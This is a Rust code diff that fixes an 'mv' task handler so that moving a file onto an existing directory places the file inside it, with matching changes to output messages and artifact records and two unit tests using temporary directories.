@@ -62,9 +62,14 @@ pub fn handle(task: &TaskMessage) -> TaskResponse {
 
     let src = Path::new(&src_str);
     let dst = Path::new(&dst_str);
+    let actual_dst = if dst.is_dir() {
+        dst.join(src.file_name().unwrap_or_default())
+    } else {
+        dst.to_path_buf()
+    };
 
     // Create parent dirs of dst if needed
-    if let Some(parent) = dst.parent()
+    if let Some(parent) = actual_dst.parent()
         && !parent.as_os_str().is_empty()
         && let Err(e) = std::fs::create_dir_all(parent)
     {
@@ -74,7 +79,7 @@ pub fn handle(task: &TaskMessage) -> TaskResponse {
         );
     }
 
-    match std::fs::rename(src, dst) {
+    match std::fs::rename(src, &actual_dst) {
         Ok(_) => TaskResponse {
             task_id: task.id,
             completed: Some(true),
@@ -82,7 +87,7 @@ pub fn handle(task: &TaskMessage) -> TaskResponse {
             user_output: Some(format!(
                 "moved {} -> {}",
                 display_path(src),
-                display_path(dst)
+                display_path(&actual_dst)
             )),
             artifacts: vec![
                 Artifact {
@@ -93,7 +98,7 @@ pub fn handle(task: &TaskMessage) -> TaskResponse {
                 },
                 Artifact {
                     base_artifact: "FileWrite".into(),
-                    artifact: display_path(dst),
+                    artifact: display_path(&actual_dst),
                     needs_cleanup: true,
                     resolved: true,
                 },
@@ -102,10 +107,10 @@ pub fn handle(task: &TaskMessage) -> TaskResponse {
         },
         Err(e) if is_cross_device(&e) => {
             // Filesystem boundary — fall back to copy + delete
-            let temp_dst = temp_path_for(dst, task.id);
+            let temp_dst = temp_path_for(&actual_dst, task.id);
             match std::fs::copy(src, &temp_dst) {
                 Ok(n) => {
-                    if let Err(e) = replace_with_temp(&temp_dst, dst) {
+                    if let Err(e) = replace_with_temp(&temp_dst, &actual_dst) {
                         let _ = std::fs::remove_file(&temp_dst);
                         return TaskResponse::failed(task.id, &e);
                     }
@@ -117,7 +122,7 @@ pub fn handle(task: &TaskMessage) -> TaskResponse {
                             user_output: Some(format!(
                                 "moved (copy+delete) {} -> {} ({} bytes)",
                                 display_path(src),
-                                display_path(dst),
+                                display_path(&actual_dst),
                                 n
                             )),
                             artifacts: vec![
@@ -129,7 +134,7 @@ pub fn handle(task: &TaskMessage) -> TaskResponse {
                                 },
                                 Artifact {
                                     base_artifact: "FileWrite".into(),
-                                    artifact: display_path(dst),
+                                    artifact: display_path(&actual_dst),
                                     needs_cleanup: true,
                                     resolved: true,
                                 },
@@ -147,7 +152,7 @@ pub fn handle(task: &TaskMessage) -> TaskResponse {
                             &format!(
                                 "copied {} -> {} but failed to remove source: {e}",
                                 display_path(src),
-                                display_path(dst)
+                                display_path(&actual_dst)
                             ),
                         ),
                     }
@@ -159,7 +164,7 @@ pub fn handle(task: &TaskMessage) -> TaskResponse {
                         &format!(
                             "rename and copy both failed for {} -> {}: {e}",
                             display_path(src),
-                            display_path(dst)
+                            display_path(&actual_dst)
                         ),
                     )
                 }
@@ -170,8 +175,74 @@ pub fn handle(task: &TaskMessage) -> TaskResponse {
             &format!(
                 "rename {} -> {} failed: {e}",
                 display_path(src),
-                display_path(dst)
+                display_path(&actual_dst)
             ),
         ),
+    }
+}
+
+#[cfg(test)]
+mod tests {
+    use super::*;
+    use std::sync::atomic::{AtomicUsize, Ordering};
+
+    fn unique_tmp(label: &str) -> std::path::PathBuf {
+        static COUNTER: AtomicUsize = AtomicUsize::new(0);
+        let n = COUNTER.fetch_add(1, Ordering::Relaxed);
+        let pid = std::process::id();
+        let mut p = std::env::temp_dir();
+        p.push(format!("nanaz-mv-test-{label}-{pid}-{n}"));
+        std::fs::create_dir_all(&p).expect("create temp dir");
+        p
+    }
+
+    #[test]
+    fn test_mv_file() {
+        let dir = unique_tmp("file");
+        let src = dir.join("src.txt");
+        let dst = dir.join("dst.txt");
+        std::fs::write(&src, b"moved").unwrap();
+        let task = TaskMessage {
+            command: "mv".into(),
+            parameters: serde_json::json!({
+                "src": src.to_string_lossy(),
+                "dst": dst.to_string_lossy(),
+            })
+            .to_string(),
+            ..Default::default()
+        };
+
+        let resp = handle(&task);
+
+        assert_eq!(resp.status.as_deref(), Some("completed"));
+        assert!(!src.exists());
+        assert_eq!(std::fs::read(&dst).unwrap(), b"moved");
+        let _ = std::fs::remove_dir_all(&dir);
+    }
+
+    #[test]
+    fn test_mv_into_existing_directory() {
+        let dir = unique_tmp("dir-target");
+        let src = dir.join("src.txt");
+        let dst_dir = dir.join("existing");
+        let dst = dst_dir.join("src.txt");
+        std::fs::create_dir_all(&dst_dir).unwrap();
+        std::fs::write(&src, b"moved into dir").unwrap();
+        let task = TaskMessage {
+            command: "mv".into(),
+            parameters: serde_json::json!({
+                "src": src.to_string_lossy(),
+                "dst": dst_dir.to_string_lossy(),
+            })
+            .to_string(),
+            ..Default::default()
+        };
+
+        let resp = handle(&task);
+
+        assert_eq!(resp.status.as_deref(), Some("completed"));
+        assert!(!src.exists());
+        assert_eq!(std::fs::read(&dst).unwrap(), b"moved into dir");
+        let _ = std::fs::remove_dir_all(&dir);
     }
 }
